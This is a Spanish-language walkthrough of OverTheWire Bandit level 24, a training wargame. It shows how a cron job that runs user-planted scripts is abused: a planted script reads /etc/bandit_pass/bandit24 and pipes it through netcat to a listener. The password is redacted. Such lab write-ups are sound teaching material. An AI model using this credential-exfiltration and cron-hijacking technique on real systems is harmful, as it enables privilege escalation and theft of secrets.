**Wargame:** Bandit  
**Platform:** OverTheWire

---
### Objective 

Un **cron job** está ejecutándose automáticamente para el usuario `bandit24`.

Nuestro objetivo es **encontrar qué script está ejecutando ese cron job** y explotar su comportamiento para obtener la contraseña del siguiente nivel.

---
### Understanding the Challenge

Los **cron jobs** son tareas programadas en sistemas Linux que se ejecutan automáticamente en intervalos definidos.

Estas tareas suelen configurarse dentro del directorio:

```Plain text
/etc/cron.d/
```

Cada archivo dentro de este directorio define qué script se ejecuta, con qué usuario y con qué frecuencia.

En este nivel, el script ejecuta todos los scripts que encuentre en un directorio específico y luego los elimina, lo que nos permite inyectar nuestro propio código.

---
### Enumerating Cron Jobs

Primero listamos los archivos dentro del directorio de cron jobs:

```bash
ls /etc/cron.d/
```

Output:

```Plain text
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
```

---
### Inspecting the Cron Job

Ahora revisamos el contenido del archivo para `bandit24`:

```bash
cat /etc/cron.d/cronjob_bandit24
```

Output:

```Plain text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Explicación:

```Plain text
@reboot * * * * * → se ejecuta al arrancar y cada minuto
bandit24          → se ejecuta como usuario bandit24
script            → /usr/bin/cronjob_bandit24.sh
```

Ahora sabemos **qué script se ejecuta automáticamente.**

---
### Inspecting the Script

Revisamos el contenido del script principal:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Output:

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

---
### Understanding the Script

El script realiza las siguientes operaciones:

1. **`cd /var/spool/bandit24/foo`** - Cambia al directorio de trabajo
    
2. **Itera sobre todos los archivos** en ese directorio
    
3. **Verifica el propietario** de cada archivo con `stat`
    
4. **Si el propietario es `bandit23`** (nosotros), ejecuta el archivo con un timeout de 60 segundos
    
5. **Elimina el archivo** después de ejecutarlo (o si no cumple la condición)

La vulnerabilidad está en que podemos crear scripts en ese directorio que, al ser ejecutados por el cron job con privilegios de `bandit24`, realicen acciones para capturar la contraseña.

---
### Setting Up the Listener

Necesitamos una terminal para recibir la contraseña. Abrimos un listener con netcat:

**Terminal 1:**

```bash
Opcion 1
ncat -l localhost 8080

Opcion 2
nc -lvnp 8080
```

Este comando se quedará a la espera de una conexión entrante en el puerto 8080.

---
### Creating the Exploit Script

En una segunda terminal, creamos nuestro script malicioso: 

```bash
cd /tmp
mkdir exploit_bandit24
cd exploit_bandit24
```

Creamos el archivo `enviar_pass.sh`:

```bash
nano enviar_pass.sh
```

Contenido del script:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 | nc localhost 8080
```

Este script, cuando sea ejecutado por el cron job, leerá la contraseña de `bandit24` y la enviará a nuestro listener.

Damos permisos de ejecución: 

```bash
chmod +x enviar_pass.sh
```

Verificamos que el propietario sea `bandit23` (nosotros):

```bash
ls -l enviar_pass.sh
```

---
### Planting the Script

Copiamos nuestro script al directorio monitoreado por el cron job:

```bash
cp enviar_pass.sh /var/spool/bandit24/foo/
```

---
### Retrieving the Password

Ahora esperamos. El cron job se ejecuta cada minuto. En menos de 60 segundos, nuestro script será ejecutado con privilegios de `bandit24`, enviará la contraseña a nuestro listener y luego será eliminado automáticamente.

Revisamos la **Terminal 1** (el listener):

```Plain text
Listening on 0.0.0.0 8080
Connection received on localhost 8080
[REDACTED]
```

Output:

```Plain text
[REDACTED]
```

Este valor corresponde a **la contraseña para Bandit Level 24.**

---
### Skills Practiced

- Análisis de **cron jobs** complejos 
- Exploración de **scripts automáticos del sistema**
- Identificación de vulnerabilidades de **ejecución de código**
- Uso de **netcat** para transferencia de datos
- Creación de scripts maliciosos para explotar tareas programadas

---
### Screenshots

